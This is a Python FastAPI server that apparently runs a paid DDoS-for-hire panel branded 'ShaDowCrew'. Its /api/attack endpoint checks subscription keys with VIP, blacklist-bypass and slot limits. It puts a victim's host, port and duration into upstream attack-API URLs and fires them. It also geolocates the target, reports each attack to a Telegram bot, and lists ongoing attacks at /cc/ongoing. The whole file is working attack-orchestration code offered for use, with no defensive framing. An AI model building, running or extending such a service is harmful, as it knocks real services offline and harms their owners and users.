# -*- coding: utf-8 -*-
from fastapi import FastAPI, Query
from fastapi.responses import Response
from datetime import datetime
import json
import time
import requests
import asyncio
import os
import socket
from urllib.parse import urlparse
import logging

# Thit lp logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

app = FastAPI()

# Khi to c�c bin cu h�nh vi gi� tr mc nh
api_data = {}
keys = {}
config = {}
blacklist = {}

# H�m ti tp JSON vi x l� li
def load_json_file(file_path: str, default: dict = {}) -> dict:
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            data = json.load(f)
            logger.info(f"{file_path} loaded successfully")
            return data
    except json.JSONDecodeError as e:
        logger.error(f"Error in {file_path}: {e}. Using default empty dict.")
        return default
    except FileNotFoundError:
        logger.error(f"{file_path} not found. Using default empty dict.")
        return default
    except Exception as e:
        logger.error(f"Unexpected error in {file_path}: {e}. Using default empty dict.")
        return default

# Ti c�c tp cu h�nh
api_data = load_json_file("apis.json")
keys = load_json_file("keys.json")
config = load_json_file("config.json")
blacklist = load_json_file("blacklist.json")

cooldowns = {}
userState = {}
attack_sessions = {}

BOT_TOKEN = config.get("telegram_bot_token", "")
CHAT_ID = config.get("telegram_chat_id", "")
THREADS = config.get("threads", 5)
RETURN_FORMAT = config.get("return_format", "pretty")
VERSION = config.get("version", "v2.0.0")
START_TIME = time.time()

# Attack Counter Setup
counter_file = "counter.txt"
if os.path.exists(counter_file):
    try:
        with open(counter_file, "r", encoding="utf-8") as f:
            attack_counter = int(f.read().strip())
    except Exception as e:
        logger.error(f"Error reading {counter_file}: {e}. Using default counter.")
        attack_counter = 680992
else:
    attack_counter = 680992

def send_telegram_log(message: str):
    if not BOT_TOKEN or not CHAT_ID:
        logger.warning("Telegram bot token or chat ID missing. Skipping log.")
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": message},
            timeout=3
        )
        logger.info("Telegram log sent successfully")
    except Exception as e:
        logger.error(f"Telegram Error: {e}")

def get_ip_info(host: str):
    try:
        parsed_url = urlparse(host)
        clean_host = parsed_url.hostname if parsed_url.hostname else host
        resolved_ip = socket.gethostbyname(clean_host)
        res = requests.get(f"http://ip-api.com/json/{resolved_ip}?fields=66846719", timeout=3).json()
        if res.get("status") == "success":
            res["resolved_ip"] = resolved_ip
            return res
    except Exception as e:
        logger.error(f"IP Lookup Error for {host}: {e}")
    return {
        "resolved_ip": host,
        "as": "Unknown",
        "city": "Unknown",
        "country": "Unknown",
        "countryCode": "Unknown",
        "isp": "Unknown",
        "org": "Unknown",
        "regionName": "Unknown",
        "timezone": "Unknown",
        "zip": ""
    }

def is_key_expired(key_data):
    expiry_str = key_data.get("expiry")
    if not expiry_str:
        return False
    try:
        expiry = datetime.strptime(expiry_str, "%d/%m/%Y")
        return datetime.now() > expiry
    except ValueError:
        logger.error(f"Invalid expiry format: {expiry_str}")
        return False

async def release_slot_after(key, duration):
    await asyncio.sleep(duration)
    userState[key] = max(0, userState.get(key, 0) - 1)
    attack_sessions[key] = [
        s for s in attack_sessions.get(key, [])
        if time.time() < s.get("end_time", 0)
    ]
    logger.info(f"Released slot for key {key}")

@app.get("/api/attack")
async def attack(
    key: str = Query(...),
    host: str = Query(...),
    port: int = Query(...),
    time_: int = Query(..., alias="time"),
    method: str = Query(...)
):
    logger.info(f"Attack request: key={key}, host={host}, port={port}, time={time_}, method={method}")

    # Kim tra host rng
    if not host or host.strip() == "":
        logger.warning("Host parameter is empty or missing")
        return Response(
            json.dumps({"status": "error", "message": "Host is required and cannot be empty."}, indent=2),
            media_type="application/json"
        )

    if port <= 0 or time_ <= 0:
        logger.warning(f"Invalid port ({port}) or time ({time_})")
        return Response(
            json.dumps({"status": "error", "message": "Invalid port or time value."}, indent=2),
            media_type="application/json"
        )

    if not keys:
        logger.error("No keys loaded. Check keys.json.")
        return Response(
            json.dumps({"status": "error", "message": "No valid keys available."}, indent=2),
            media_type="application/json"
        )

    if key not in keys:
        logger.warning(f"Invalid key: {key}")
        return Response(
            json.dumps({"status": "error", "message": "Invalid key."}, indent=2),
            media_type="application/json"
        )

    key_data = keys[key]
    if key_data.get("banned", False):
        logger.warning(f"Key {key} is banned")
        return Response(
            json.dumps({"status": "error", "message": "Key is banned."}, indent=2),
            media_type="application/json"
        )
    if is_key_expired(key_data):
        logger.warning(f"Key {key} is expired")
        return Response(
            json.dumps({"status": "error", "message": "Key expired."}, indent=2),
            media_type="application/json"
        )

    user_id = key_data.get("user", "")
    blacklist_hosts = blacklist.get("hosts", [])
    blacklist_users = blacklist.get("users", [])
    if (host in blacklist_hosts or user_id in blacklist_users) and not key_data.get("bypass_blacklist", False):
        logger.warning(f"Blacklist violation: host={host}, user={user_id}")
        return Response(
            json.dumps({"status": "error", "message": "Target or user is blacklisted."}, indent=2),
            media_type="application/json"
        )

    if not api_data or method not in api_data:
        logger.error(f"Invalid method: {method}. Check apis.json.")
        return Response(
            json.dumps({"status": "error", "message": "Invalid method."}, indent=2),
            media_type="application/json"
        )

    now = time.time()
    cooldown_time = int(key_data.get("cooldown", 10))
    remaining = cooldown_time - (now - cooldowns.get(key, 0))
    if remaining > 0:
        logger.info(f"Cooldown active for key {key}: {int(remaining)}s remaining")
        return Response(
            json.dumps({"status": "error", "message": f"Cooldown active. Wait {int(remaining)}s"}, indent=2),
            media_type="application/json"
        )
    cooldowns[key] = now

    userState.setdefault(key, 0)
    max_cons = int(key_data.get("maxCons", 1))
    if userState[key] >= max_cons:
        logger.warning(f"Slot limit reached for key {key}: {userState[key]}/{max_cons}")
        return Response(
            json.dumps({"status": "error", "message": "Slot limit reached."}, indent=2),
            media_type="application/json"
        )

    attack_sessions.setdefault(key, [])
    power_saving = config.get("powersaving", False) or key_data.get("powersaving", False)
    if power_saving and not key_data.get("bypass_blacklist", False):
        for s in attack_sessions[key]:
            if time.time() < s.get("end_time", 0) and s["host"] == host and s["port"] == port:
                logger.warning(f"Attack already ongoing for key {key} on {host}:{port}")
                return Response(
                    json.dumps({"status": "error", "message": "Attack already ongoing on this target for your key (power saving active)."}, indent=2),
                    media_type="application/json"
                )

    userState[key] += 1
    global attack_counter
    attack_counter += 1
    try:
        with open(counter_file, "w", encoding="utf-8") as f:
            f.write(str(attack_counter))
    except Exception as e:
        logger.error(f"Error writing to {counter_file}: {e}")

    attack_id = attack_counter
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ipData = get_ip_info(host)
    end_time = time.time() + time_

    attack_sessions[key].append({
        "user": "ShaDowCrew",
        "method": method,
        "host": host,
        "port": port,
        "end_time": end_time,
        "duration": time_
    })

    urls = [
        url.replace("<<$host>>", host)
           .replace("<<$port>>", str(port))
           .replace("<<$time>>", str(time_))
        for url in api_data[method].get("api", [])
    ]

    results = []
    for url in urls[:3] if power_saving else urls:
        start = time.time()
        try:
            response = requests.get(url, timeout=3)
            logger.info(f"Request to {url}: {response.status_code}")
        except Exception as e:
            logger.error(f"Request to {url} failed: {e}")
        end = time.time()
        ms = round((end - start) * 1000, 2)
        results.append({"url": url, "ms": ms})

    avg_response_time = round(sum(r.get("ms", 0) for r in results) / len(results), 2) if results else 0

    send_telegram_log(
        "\n".join([
            " API Logs Attack",
            f" Key: {key}",
            f" Target: {host}",
            f" Port: {port}",
            f" Method: {method}",
            f" Time: {time_}s",
            f" Threads: {THREADS}",
            f" VIP: {'Yes' if key_data.get('vip') else 'No'}",
            f" Admin: {'Yes' if key_data.get('admin') else 'No'}",
            f" Slots: {userState[key]}/{key_data.get('maxCons', 1)}",
            f" Sent: {timestamp}",
            f" Attack ID: #{attack_id}"
        ])
    )

    asyncio.create_task(release_slot_after(key, time_))

    response_obj = {
        "ShaDowCrew": "Attack Sent Successfully",
        "attack_id": f"#{attack_id}",
        "concurrents_used": userState[key],
        "duration": f"{time_}s",
        "error": False,
        "method_used": method,
        "port": port,
        "target": host,
        "target_asn": ipData.get("as", "Unknown"),
        "target_city": ipData.get("city", "Unknown"),
        "target_country": ipData.get("country", "Unknown"),
        "target_country_code": ipData.get("countryCode", "Unknown"),
        "target_isp": ipData.get("isp", "Unknown"),
        "target_org": ipData.get("org", "Unknown"),
        "target_region": ipData.get("regionName", "Unknown"),
        "target_timezone": ipData.get("timezone", "Unknown"),
        "target_zip": ipData.get("zip", ""),
        "threads": THREADS,
        "vip": key_data.get("vip", False),
        "admin": key_data.get("admin", False),
        "bypass_blacklist": key_data.get("bypass_blacklist", False),
        "expiry": key_data.get("expiry", "None"),
        "time_to_send": f"{avg_response_time}ms",
        "your_running_attacks": f"{userState[key]}/{key_data.get('maxCons', 1)}",
        "time_sent": timestamp
    }

    return Response(content=json.dumps(response_obj, indent=2), media_type="application/json")

@app.get("/api/methods")
def get_methods():
    if not api_data:
        logger.error("No methods available. Check apis.json.")
        return Response(json.dumps({"status": "error", "message": "No methods available."}, indent=2), media_type="application/json")
    return Response(content=json.dumps({"methods": list(api_data.keys())}, indent=2), media_type="application/json")

@app.get("/cc/ongoing")
def get_ongoing_attacks():
    current_time = time.time()
    ongoing = {}

    for key, sessions in attack_sessions.items():
        active_sessions = [
            {
                "method": s["method"],
                "host": s["host"],
                "port": s["port"],
                "end_time": datetime.fromtimestamp(s["end_time"]).strftime("%Y-%m-%d %H:%M:%S"),
                "duration": s["duration"]
            }
            for s in sessions if current_time < s["end_time"]
        ]
        if active_sessions:
            ongoing[key] = active_sessions

    return Response(content=json.dumps({"ongoing_attacks": ongoing}, indent=2), media_type="application/json")

if __name__ == "__main__":
    import uvicorn
    logger.info("Starting FastAPI server...")
    uvicorn.run(app, host="174.138.18.138", port=8000)
